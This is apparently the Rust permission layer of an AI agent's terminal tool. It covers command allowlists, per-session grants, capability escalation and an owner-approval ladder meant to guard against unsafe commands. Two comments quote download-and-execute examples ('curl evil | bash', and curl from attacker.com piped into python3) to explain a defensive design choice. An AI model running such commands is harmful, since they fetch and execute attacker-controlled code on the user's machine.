//! Allowlists, session prefixes, capability grants and the owner
//! approval ladder.

use super::*;

impl TerminalTool {
    /// Whether a grant covers `command`: the owner's full access, a
    /// permanent prefix, or an "allow for session" given in `grant_session`
    /// (never one given in another chat).
    pub(super) async fn is_allowed(&self, command: &str, grant_session: &str) -> bool {
        if self.trust_all_enabled().await {
            return true;
        }
        let prefixes = self.allowed_prefixes.read().await;
        let trimmed = command.trim();
        let sessions = self.session_approved.read().await;
        let empty = HashSet::new();
        let session = sessions.get(grant_session).unwrap_or(&empty);
        // The exact command the owner allowed for this chat runs again.
        if contains_shell_operator(trimmed) && session.contains(trimmed) {
            return true;
        }
        // A grant names a program. A command that launches another program
        // through it, writes a file by redirection or sets variables for it
        // does more than that program does, and is not covered.
        if aidaemon_policies::exceeds_program_grant(trimmed) {
            return false;
        }
        let has_shell_ops = contains_shell_operator(trimmed);

        // For chained commands (&&, ||, ;, |), check each segment's binary
        // against the permanent prefixes.
        if has_shell_ops {
            // 1) Exact full-command match: session approvals store chained
            //    commands verbatim (`add_session_prefix`), and legacy
            //    permanent entries (pre-segment-binary `add_prefix`) stored
            //    whole chained commands too.
            if session.iter().any(|s| trimmed == s.as_str())
                || prefixes.iter().any(|p| trimmed == p.as_str())
            {
                return true;
            }
            // 2) Per-segment match: every segment's binary must be in the
            //    PERMANENT prefix list (configured by the operator). We
            //    deliberately do NOT consult `session` here — a simple-command
            //    session approval for `curl` must not retroactively unlock
            //    arbitrary chained commands like `curl evil | bash`. Operator-
            //    configured permanent prefixes are trusted; ad-hoc session
            //    approvals are not.
            // A nested command is not one of the segments, so no segment
            // check can vouch for it.
            let scan = aidaemon_policies::scan_shell(trimmed);
            if scan.has_substitution {
                return false;
            }
            let segments = scan.segments;
            if !segments.is_empty() {
                return segments.iter().all(|seg| {
                    let binary = extract_segment_binary(seg);
                    if binary.is_empty() {
                        return true;
                    }
                    prefixes.iter().any(|p| binary == p.as_str())
                });
            }
            return false;
        }

        // Check permanent prefixes
        let matches_permanent = prefixes.iter().any(|prefix| {
            trimmed == prefix.as_str()
                || trimmed.starts_with(&format!("{} ", prefix))
                || trimmed.starts_with(&format!("{}\t", prefix))
        });

        if matches_permanent {
            return true;
        }

        // Check session-approved keys (program and subcommand)
        session
            .iter()
            .any(|key| trimmed == key.as_str() || covered_by_session_key(trimmed, key))
    }

    /// Add a grant to `grant_session`'s "allow for session" list (cleared
    /// on restart; never shared with another chat).
    ///
    /// For SIMPLE commands (no shell operators), stores the program and its
    /// subcommand ([`session_grant_key`]): later calls of that program
    /// subcommand are allowed, other subcommands are not.
    ///
    /// For CHAINED commands (containing shell operators), stores ONLY the
    /// full trimmed command for exact-match matching. We intentionally do NOT
    /// add per-segment binaries to the session prefix set: approving
    /// `curl https://example.com | python3 -c '<safe>'` once must NOT later
    /// auto-allow `curl https://attacker.com | python3 -c '<evil>'`. The
    /// exact-match check in `is_allowed` handles legitimate re-runs.
    pub(super) async fn add_session_prefix(&self, command: &str, grant_session: &str) {
        let trimmed = command.trim();
        let mut sessions = self.session_approved.write().await;
        let session = sessions.entry(grant_session.to_string()).or_default();
        if contains_shell_operator(trimmed) {
            if session.insert(trimmed.to_string()) {
                info!(
                    command = %trimmed,
                    "Session-approved full chained command (exact-match only)"
                );
            }
        } else {
            let key = session_grant_key(trimmed);
            if session.insert(key.clone()) {
                info!(
                    prefix = %key,
                    "Added to session-approved commands (will reset on restart)"
                );
            }
        }
    }

    /// The hard blocks a `run` meets before any approval (T2–T7, in order):
    /// unscoped recursive grep and unbounded disk scans, large unquoted
    /// heredocs, AppleScript UI scripting, daemonization by a non-owner or
    /// without `detach=true`, and detached runs
    /// in trusted scheduled sessions. The tool refuses these whatever the
    /// owner said, so the kernel's rules never ask about them.
    pub(super) fn pre_approval_block(
        &self,
        args: &TerminalArgs,
        command: &str,
        trust: &TerminalTrust,
    ) -> Option<String> {
        if let Some((pattern, path)) = detect_unscoped_recursive_grep(command) {
            return Some(recursive_grep_block_message(&pattern, &path));
        }
        if let Some((tool_name, root)) = detect_unbounded_disk_scan(command) {
            return Some(unbounded_scan_block_message(&tool_name, &root));
        }
        // Soft-block large heredoc file creation: redirects to write_file
        // which writes atomically without shell quoting issues. Allow quoted
        // heredoc delimiters (<<'EOF' or << 'EOF') since they avoid shell
        // expansion issues and serve as a fallback when write_file fails
        // with JSON escaping errors on complex content.
        if command.contains("<<") && command.len() > 500 {
            let uses_quoted_heredoc = command.contains("<<'")
                || command.contains("<< '")
                || command.contains("<<\"")
                || command.contains("<< \"");
            if !uses_quoted_heredoc {
                return Some(
                    "Large heredoc file creation is unreliable through the terminal. \
                     Use the `write_file` tool instead — it writes files atomically \
                     and avoids shell quoting issues. If write_file fails with JSON \
                     encoding errors, use a quoted heredoc: cat > file << 'EOF'"
                        .to_string(),
                );
            }
        }
        // Hard-redirect AppleScript GUI automation to computer_use: the
        // terminal path has none of its safety layer (approvals, blocked
        // apps, action confirmation, lock detection) and System Events input
        // fails against a locked screen exactly like synthetic input.
        if is_system_events_ui_scripting(command) {
            return Some(
                "Blocked: AppleScript System Events UI scripting (click/keystroke) \
                 through the terminal bypasses the computer_use safety layer and \
                 cannot deliver input when the screen is locked.\n\n\
                 Use the `computer_use` tool for GUI automation — it is \
                 approval-gated, lock-aware, and works from screenshots and the \
                 accessibility tree. If computer_use is unavailable or blocked \
                 (e.g. the screen is locked), stop and tell the user what you \
                 need instead of scripting around it."
                    .to_string(),
            );
        }
        let daemon_hits = detect_daemonization_primitives(command);
        if !daemon_hits.is_empty() {
            if !trust.owner {
                return Some(format!(
                    "Blocked: daemonization primitives detected ({}) and only owners can approve detached/background process commands.",
                    daemon_hits.join(", ")
                ));
            }
            if !args.detach {
                return Some(format!(
                    "Blocked: daemonization primitives detected ({}). \
                     Set `detach=true` explicitly for intentional long-lived background execution.",
                    daemon_hits.join(", ")
                ));
            }
        }
        if args.detach && trust.trusted_session {
            // Intentional: trusted scheduled sessions are auto-approved, so
            // disallow detached long-lived processes in that mode.
            return Some(
                "Blocked: detach=true is not allowed for trusted scheduled sessions.".to_string(),
            );
        }
        None
    }

    /// The confined tier a `run` falls in, if any: a `command` (not a script)
    /// on the confined allowlist ([`terminal_confined::confined_access`]),
    /// in the foreground, with no network, write paths or scope escalation,
    /// from a session that is neither an untrusted trigger nor a trusted
    /// scheduled one, touching no protected credential path, and not
    /// already granted by the owner (a granted command runs as before). The
    /// approval ladder allows such a run without a card, and the run then
    /// executes confined with the tier's access: both read this one
    /// decision.
    pub(super) async fn confined_tier(
        &self,
        args: &TerminalArgs,
        command: &str,
        trust: &TerminalTrust,
    ) -> Option<ConfinedAccess> {
        let plain_command = args
            .command
            .as_deref()
            .map(str::trim)
            .is_some_and(|line| line == command)
            && args.script.as_deref().is_none_or(|s| s.trim().is_empty());
        if !plain_command
            || args.detach
            || args.background
            || args.network
            || args
                .write_paths
                .iter()
                .chain(args.write_roots.iter())
                .any(|path| !path.trim().is_empty())
            || trust.scope_escalation.is_some()
            || trust.untrusted_source
            || trust.trusted_session
            || approval_floor_reason(command).is_some()
            || aidaemon_tools::command_risk::persistence_floor_reason(
                command,
                args.working_dir.as_deref(),
                &[],
            )
            .is_some()
        {
            return None;
        }
        let access = terminal_confined::confined_access(command)?;
        if self.is_allowed(command, &trust.grant_session).await {
            return None;
        }
        Some(access)
    }

    /// Run a confined-tier command: in the confined sandbox with the tier's
    /// access, whatever the terminal's own confinement.
    /// Where a cut output's full text is saved: `session`'s spill folder,
    /// on the local backend only (the folder is on this computer).
    pub(super) fn spill_session<'s>(&self, session: &'s str) -> Option<&'s str> {
        let session = session.trim();
        (self.backend.kind() == BackendKind::Local && !session.is_empty()).then_some(session)
    }

    pub(super) async fn run_confined_tier(
        &self,
        args: &TerminalArgs,
        command: &str,
        access: ConfinedAccess,
        session: &str,
    ) -> anyhow::Result<ToolCallOutcome> {
        let mut read_paths = args.read_paths.clone();
        read_paths.extend(args.read_roots.iter().cloned());
        let run = terminal_confined::run_confined(
            &self.backend,
            command,
            args.working_dir.as_deref(),
            &read_paths,
            access,
        )
        .await?;
        let exit_code = Some(run.output.exit_code);
        let (mut output, truncation) = format_output(
            &run.output.stdout,
            &run.output.stderr,
            self.max_output_chars,
            self.spill_session(session),
        );
        push_exit_status(&mut output, exit_code);
        if let Some(hint) =
            confined_opaque_failure_hint(exit_code, &run.output.stdout, &run.output.stderr)
        {
            output.push_str(&hint);
        }
        let dir = ToolTargetHint::new(ToolTargetHintKind::ProjectScope, run.dir.clone());
        let mut read_targets: Vec<ToolTargetHint> = dir.iter().cloned().collect();
        for path in read_paths.iter().chain(run.adapter_read_paths.iter()) {
            if let Some(target) = ToolTargetHint::new(ToolTargetHintKind::Path, path.clone())
                && !read_targets.contains(&target)
            {
                read_targets.push(target);
            }
        }
        let (semantics, write_targets) = match access {
            ConfinedAccess::ReadOnly => (ToolCallSemantics::observation(), Vec::new()),
            ConfinedAccess::WorkspaceWrite => (
                ToolCallSemantics::observation_and_mutation_with(
                    ToolMutationEffects::LOCAL_DERIVED_WRITE,
                ),
                dir.into_iter().collect(),
            ),
        };
        let mut metadata = foreground_terminal_metadata(exit_code);
        metadata.truncation = truncation;
        metadata.semantics = semantics
            .with_verification_mode(crate::tools::traits::ToolVerificationMode::ResultContent);
        metadata.access_manifest = Some(crate::tools::traits::ToolCallAccessManifest {
            execution_cwd: Some(run.dir),
            read_targets,
            write_targets,
            adapter_read_targets: Vec::new(),
        });
        Ok(ToolCallOutcome {
            output,
            metadata,
            finish: None,
        })
    }

    /// The owner-approval ladder for a `run` past the hard blocks: what the
    /// owner must approve, or `None` when it runs without asking.
    ///
    /// Order (load-bearing; do not reorder):
    ///   1. capability escalation  → new authority always asks
    ///   2. daemonization          → the owner's Critical daemonization card
    ///   3. untrusted trigger      → external triggers always ask
    ///  3b. persistence path       → a change naming a shell start-up file,
    ///      launch agent, cron entry, git hook or the daemon's instructions
    ///      always asks (before the trusted session and every grant)
    ///   4. detach && !allowed     → novel detached commands ask
    ///   5. trusted session        → scheduled tasks run without asking; this
    ///      precedes the floor on purpose (an explicit owner grant: unattended
    ///      deploys use `ssh -i ~/.ssh/key`)
    ///   6. approval floor         → protected credential path, never
    ///      downgraded; before the explicit allow, so no grant skips it
    ///   7. explicit allow         → a prior owner grant (session or persisted)
    ///   8. confined tier          → an allowlisted build, lint, read-only git
    ///      or inspection command runs confined without asking
    ///      (`confined_tier`; the run executes it confined)
    ///   9. semantic assessment    → ask only for dangerous effects; a failure
    ///      or a timeout fails closed to Critical
    ///  10. no assessor configured → Critical
    pub(super) async fn approval_ladder(
        &self,
        args: &TerminalArgs,
        command: &str,
        trust: &TerminalTrust,
    ) -> Option<LadderAsk> {
        let daemon_hits = detect_daemonization_primitives(command);
        let daemonization = !daemon_hits.is_empty();
        let deterministic_approval_floor = approval_floor_reason(command);
        let declared_writes = args
            .write_paths
            .iter()
            .chain(args.write_roots.iter())
            .cloned()
            .collect::<Vec<_>>();
        let persistence_floor = aidaemon_tools::command_risk::persistence_floor_reason(
            command,
            args.working_dir.as_deref(),
            &declared_writes,
        );
        let mut approval_risk = RiskLevel::High;
        let mut approval_warnings = Vec::new();
        if args.detach && !daemonization {
            approval_warnings.push(
                "Detached execution requested (process may outlive task boundaries).".to_string(),
            );
        }
        // `is_allowed` checks both permanent AND session-approved prefixes.
        let is_allowed = self.is_allowed(command, &trust.grant_session).await;
        let requested_capabilities =
            Self::requested_capabilities(run_is_confined(self.confinement), args, trust);
        let capability_escalation_pending = !requested_capabilities.is_empty()
            && !trust.trusted_session
            && !self
                .capabilities_granted(command, &requested_capabilities, &trust.grant_session)
                .await;
        debug!(command = %command, "Approval check");
        let needs_approval = if capability_escalation_pending {
            // Elevated capability is new authority; no command-prefix grant
            // or dispatcher preapproval stands in for the user seeing exactly
            // what is being requested.
            approval_warnings.push(format!(
                "Requests elevated capabilities beyond the task scope: {}",
                Self::describe_capabilities(&requested_capabilities)
            ));
            info!(command = %LoggedCommand(command), capabilities = ?requested_capabilities, "Forcing approval: capability escalation");
            true
        } else if daemonization {
            false
        } else if trust.untrusted_source {
            // External triggers always need approval regardless of mode
            approval_warnings
                .push("Command originated from an untrusted external trigger.".to_string());
            info!(command = %LoggedCommand(command), risk = %approval_risk, "Forcing approval: untrusted source");
            true
        } else if let Some(reason) = persistence_floor {
            // A write that plants something run or obeyed later (a shell
            // start-up file, a launch agent, a git hook, the daemon's own
            // instructions) asks every time: no grant, scheduled session or
            // confined tier stands in for the owner seeing it.
            approval_warnings.push(reason);
            info!(command = %LoggedCommand(command), "Forcing approval: persistence path");
            true
        } else if args.detach && !is_allowed {
            // Allowlisted commands (permanent or session approvals) may run
            // detached without asking again; only novel detached commands do.
            info!(command = %LoggedCommand(command), "Forcing approval: detach=true and command not pre-approved");
            true
        } else if trust.trusted_session {
            info!(command = %LoggedCommand(command), session = %trust.session_id, "Auto-approved: trusted scheduled task");
            false
        } else if let Some(reason) = deterministic_approval_floor {
            // Before the explicit allow (owner ruling): an allowlisted or
            // session-granted command touching a credential path still asks.
            approval_warnings.push(reason);
            true
        } else if is_allowed {
            info!(command = %LoggedCommand(command), "Auto-approved: explicit command grant");
            false
        } else if self.confined_tier(args, command, trust).await.is_some() {
            info!(command = %LoggedCommand(command), "Auto-approved: allowlisted command runs confined");
            false
        } else if let Some(side_calls) = self.side_calls.get() {
            match assess_command(
                side_calls,
                command,
                args.working_dir.as_deref(),
                &self.backend,
            )
            .await
            {
                Ok(semantic) => {
                    approval_risk = semantic.risk_level;
                    approval_warnings = semantic.warnings;
                    if semantic.requires_approval {
                        info!(command = %LoggedCommand(command), risk = %approval_risk, "Semantic command assessment requires owner approval");
                        true
                    } else {
                        info!(command = %LoggedCommand(command), risk = %approval_risk, "Auto-approved by semantic command assessment");
                        false
                    }
                }
                Err(error) => {
                    warn!(command = %LoggedCommand(command), %error, "Semantic command assessment failed; requesting approval");
                    approval_risk = RiskLevel::Critical;
                    approval_warnings.push(format!(
                        "Semantic safety assessment unavailable; failed closed: {}",
                        error
                    ));
                    true
                }
            }
        } else {
            approval_risk = RiskLevel::Critical;
            approval_warnings
                .push("Semantic safety assessment is not configured; failed closed.".to_string());
            true
        };

        if daemonization {
            // The owner's daemonization card (Critical); a capability
            // escalation of the same run is asked on the same card.
            let mut warnings = vec![
                format!(
                    "Daemonization primitives detected: {}",
                    daemon_hits.join(", ")
                ),
                "Detached/background processes may survive cancellation and continue running."
                    .to_string(),
                "Approve only if this is intentional and necessary.".to_string(),
            ];
            if capability_escalation_pending {
                warnings.extend(approval_warnings);
            }
            return Some(LadderAsk {
                risk: RiskLevel::Critical,
                warnings,
            });
        }
        if !needs_approval {
            return None;
        }
        // Approval history is useful context for the owner, but it never
        // changes the decision or lowers risk.
        if let Some(ref pool) = self.pool
            && let Ok(Some((pattern, similarity))) = find_matching_pattern(pool, command).await
        {
            approval_warnings.push(format!(
                    "Similar command history: '{}' (similarity {:.0}%, approvals {}, denials {}, confidence {:.0}%, trusted {})",
                    pattern.pattern,
                    similarity * 100.0,
                    pattern.approval_count,
                    pattern.denial_count,
                    pattern.confidence() * 100.0,
                    pattern.is_trusted(),
                ));
        }
        Some(LadderAsk {
            risk: approval_risk,
            warnings: approval_warnings,
        })
    }

    /// The command a `run` call executes, if it is one.
    pub(super) fn run_command(args: &TerminalArgs) -> Option<&str> {
        if !matches!(
            TerminalAction::parse(&args.action),
            TerminalAction::Run | TerminalAction::Unrecognized
        ) {
            return None;
        }
        let command = args
            .command
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty());
        let script = args
            .script
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty());
        match (command, script) {
            (Some(command), None) => Some(command),
            (None, Some(script)) => Some(script),
            _ => None,
        }
    }

    /// A terminal call's arguments, or why they cannot be read.
    pub(super) fn read_arguments(arguments: &Value) -> Result<TerminalArgs, String> {
        serde_json::from_value(arguments.clone()).map_err(|error| error.to_string())
    }

    /// Why a terminal call's arguments cannot be read, if they cannot.
    pub(crate) fn unreadable_reason(arguments: &Value) -> Option<String> {
        Self::read_arguments(arguments).err()
    }

    /// The card for a terminal call whose arguments cannot be read: nothing
    /// about it can be judged, so the owner sees the raw arguments, Critical.
    pub(crate) fn unreadable_request(
        &self,
        raw: &Value,
        reason: &str,
    ) -> aidaemon_core::OwnerApprovalRequest {
        let shown = raw.to_string();
        aidaemon_core::OwnerApprovalRequest {
            card: None,
            effects: Vec::new(),
            summary: format!("terminal {shown}"),
            subject: format!("terminal {shown}"),
            risk: aidaemon_core::ApprovalRisk::Critical,
            warnings: vec![
                format!(
                    "Execution target: {} ({}) workspace {}",
                    self.backend.kind().as_str(),
                    self.backend.id(),
                    self.backend.workspace_root()
                ),
                format!(
                    "The call's arguments could not be read ({reason}); nothing about what it \
                     does could be judged."
                ),
            ],
        }
    }

    /// The owner approval a terminal call needs, for the daemon's kernel
    /// approval rules: the T8 ladder for `run` (after the hard blocks, which
    /// the tool refuses on its own), the trust-all card, or `None`. The
    /// subject is the full command line, which the terminal's grants match.
    pub(crate) async fn owner_approval_request(
        &self,
        arguments: &Value,
        trust: &TerminalTrust,
    ) -> Result<Option<aidaemon_core::OwnerApprovalRequest>, String> {
        let args: TerminalArgs = Self::read_arguments(arguments)?;
        let (subject, ask) = match TerminalAction::parse(&args.action) {
            // Not a tool action any more: the call only says so.
            TerminalAction::TrustAll => return Ok(None),
            TerminalAction::Run | TerminalAction::Unrecognized => {
                // Neither or both of command and script: the tool refuses it.
                let Some(command) = Self::run_command(&args) else {
                    return Ok(None);
                };
                if self.pre_approval_block(&args, command, trust).is_some() {
                    return Ok(None);
                }
                let Some(ask) = self.approval_ladder(&args, command, trust).await else {
                    return Ok(None);
                };
                (command.to_string(), ask)
            }
            _ => return Ok(None),
        };
        let mut warnings = ask.warnings;
        warnings.insert(
            0,
            format!(
                "Execution target: {} ({}) workspace {}",
                self.backend.kind().as_str(),
                self.backend.id(),
                self.backend.workspace_root()
            ),
        );
        if let Some(store) = &self.event_store {
            let emitter =
                aidaemon_events::EventEmitter::new(store.clone(), trust.session_id.clone());
            let _ = emitter
                .emit(
                    EventType::ApprovalRequested,
                    ApprovalRequestedData {
                        command: subject.clone(),
                        risk_level: ask.risk.to_string(),
                        warnings: warnings.clone(),
                        task_id: None,
                    },
                )
                .await;
        }
        // A command's card says what it does from its structure.
        let card = Some(Box::new(aidaemon_tools::command_effects::command_card(
            &subject,
            call_title(&args),
        )));
        Ok(Some(aidaemon_core::OwnerApprovalRequest {
            card,
            effects: Vec::new(),
            // What a channel without cards shows: no secret either.
            summary: aidaemon_tools::sanitize::redact_command_secrets(&subject),
            subject,
            risk: crate::approvals::approval_risk(ask.risk),
            warnings,
        }))
    }

    /// Apply the owner's answer to a terminal card the kernel asked, as the
    /// in-tool prompt did: Allow Once only learns; Allow Session adds the
    /// session prefix and capability grants; Allow Always persists the
    /// prefix and the capability grants; an explicit Deny is learned as a
    /// denial (`None`: the card timed out or never arrived). A daemonization
    /// card grants nothing beyond the run, as before.
    pub(crate) async fn record_owner_answer(
        &self,
        arguments: &Value,
        trust: &TerminalTrust,
        response: Option<ApprovalResponse>,
    ) {
        let Ok(args) = serde_json::from_value::<TerminalArgs>(arguments.clone()) else {
            return;
        };
        let Some(command) = Self::run_command(&args) else {
            return;
        };
        if let Some(store) = &self.event_store {
            let emitter =
                aidaemon_events::EventEmitter::new(store.clone(), trust.session_id.clone());
            let approval_type = match response {
                Some(ApprovalResponse::AllowOnce) => Some("once"),
                Some(ApprovalResponse::AllowSession) => Some("session"),
                Some(ApprovalResponse::AllowAlways) => Some("always"),
                _ => None,
            };
            let _ = match approval_type {
                Some(approval_type) => {
                    emitter
                        .emit(
                            EventType::ApprovalGranted,
                            ApprovalGrantedData {
                                command: command.to_string(),
                                approval_type: approval_type.to_string(),
                                task_id: None,
                            },
                        )
                        .await
                }
                None => {
                    emitter
                        .emit(
                            EventType::ApprovalDenied,
                            ApprovalDeniedData {
                                command: command.to_string(),
                                task_id: None,
                            },
                        )
                        .await
                }
            };
        }
        let requested_capabilities =
            Self::requested_capabilities(run_is_confined(self.confinement), &args, trust);
        let capability_escalation = !requested_capabilities.is_empty() && !trust.trusted_session;
        if !detect_daemonization_primitives(command).is_empty() && !capability_escalation {
            return;
        }
        match response {
            Some(ApprovalResponse::AllowOnce) => {}
            Some(ApprovalResponse::AllowSession) => {
                // Session-only storage (cleared on restart).
                self.add_session_prefix(command, &trust.grant_session).await;
                self.add_capability_grants(
                    command,
                    &requested_capabilities,
                    false,
                    &trust.grant_session,
                )
                .await;
            }
            Some(ApprovalResponse::AllowAlways) => {
                self.add_prefix(command).await;
                self.add_capability_grants(
                    command,
                    &requested_capabilities,
                    true,
                    &trust.grant_session,
                )
                .await;
            }
            Some(ApprovalResponse::Deny) => {
                if let Some(ref pool) = self.pool {
                    let _ = record_denial(pool, command).await;
                }
                return;
            }
            None => return,
        }
        if let Some(ref pool) = self.pool {
            let _ = record_approval(pool, command).await;
        }
    }

    /// Elevated capabilities a run asks for beyond its task scope, as stable
    /// grant keys: `network`, `read:<path>`, `write:<path>`.
    /// On the host the process already has the user's environment, network
    /// and (non-secret) files; there is no sandbox grant to escalate.
    /// Credential stores stay rejected upstream.
    pub(super) fn requested_capabilities(
        confined: bool,
        args: &TerminalArgs,
        trust: &TerminalTrust,
    ) -> Vec<String> {
        if !confined {
            return Vec::new();
        }
        let mut capabilities = Vec::new();
        if args.network {
            capabilities.push("network".to_string());
        }
        if let Some(escalation) = &trust.scope_escalation {
            capabilities.extend(escalation.read_paths.iter().map(|p| format!("read:{p}")));
            capabilities.extend(escalation.write_paths.iter().map(|p| format!("write:{p}")));
        }
        capabilities
    }

    pub(super) fn describe_capabilities(capabilities: &[String]) -> String {
        capabilities
            .iter()
            .map(|capability| match capability.split_once(':') {
                Some(("read", path)) => format!("read outside task scope: {path}"),
                Some(("write", path)) => format!("write outside task scope: {path}"),
                _ => "outbound network access".to_string(),
            })
            .collect::<Vec<_>>()
            .join("; ")
    }

    /// True when every requested capability is already granted for every
    /// binary the command runs (or the owner trusts all commands).
    pub(super) async fn capabilities_granted(
        &self,
        command: &str,
        capabilities: &[String],
        grant_session: &str,
    ) -> bool {
        if capabilities.is_empty() {
            return true;
        }
        if self.trust_all_enabled().await {
            return true;
        }
        let grants = self.capability_grants.read().await;
        let session_grants = self.session_capability_grants.read().await;
        command_grant_keys(command).iter().all(|key| {
            capabilities.iter().all(|capability| {
                grants.contains(&(key.clone(), capability.clone()))
                    || session_grants.contains(&(
                        grant_session.to_string(),
                        key.clone(),
                        capability.clone(),
                    ))
            })
        })
    }

    pub(super) async fn add_capability_grants(
        &self,
        command: &str,
        capabilities: &[String],
        persist: bool,
        grant_session: &str,
    ) {
        let keys = command_grant_keys(command);
        if !persist {
            let mut grants = self.session_capability_grants.write().await;
            for key in keys {
                for capability in capabilities {
                    if grants.insert((grant_session.to_string(), key.clone(), capability.clone())) {
                        info!(prefix = %key, capability = %capability, "Granted terminal capability for the session");
                    }
                }
            }
            return;
        }
        let mut grants = self.capability_grants.write().await;
        for key in keys {
            for capability in capabilities {
                if !grants.insert((key.clone(), capability.clone())) {
                    continue;
                }
                info!(prefix = %key, capability = %capability, persist, "Granted terminal capability");
                if let Some(ref pool) = self.pool
                    && let Err(e) = crate::tools::terminal_grants::add_capability(
                        pool,
                        self.backend.approval_scope(),
                        &key,
                        capability,
                    )
                    .await
                {
                    warn!(prefix = %key, capability = %capability, "Failed to persist capability grant: {}", e);
                }
            }
        }
    }

    pub(super) async fn add_prefix(&self, command: &str) {
        let keys = command_grant_keys(command);
        let mut prefixes = self.allowed_prefixes.write().await;
        for key in keys {
            if key == "*" {
                warn!("Refusing to add wildcard '*' as permanent prefix");
                continue;
            }
            if !prefixes.contains(&key) {
                info!(prefix = %key, "Adding to allowed command prefixes (persistent)");
                prefixes.push(key.clone());

                // Persist to SQLite
                if let Some(ref pool) = self.pool
                    && let Err(e) = crate::tools::terminal_grants::add_prefix(
                        pool,
                        self.backend.approval_scope(),
                        &key,
                    )
                    .await
                {
                    warn!(prefix = %key, "Failed to persist allowed prefix: {}", e);
                }
            }
        }
    }
}
